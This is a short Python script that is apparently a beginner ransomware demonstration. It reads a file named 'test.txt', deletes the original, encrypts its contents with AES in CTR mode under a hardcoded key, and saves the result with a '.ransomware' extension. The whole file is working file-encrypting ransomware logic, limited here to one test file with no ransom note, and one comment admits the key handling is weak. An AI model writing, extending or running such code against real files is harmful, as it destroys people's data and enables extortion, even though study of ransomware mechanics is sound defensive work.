import os
import pyaes

# open file to be encrypted 

file_name = 'test.txt'
with open(file_name, 'rb') as file:
    file_data = file.read()

# delete original file

os.remove(file_name)

# Define cryptographic key (I guess assymetric cryptography would be better; But I dont think anyone will read this.)

key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

# Encrypting the file

crypto_data = aes.encrypt(file_data)

# Save the encrypted file
with open(file_name + '.ransomware', 'wb') as encrypted_file:
    encrypted_file.write(crypto_data)

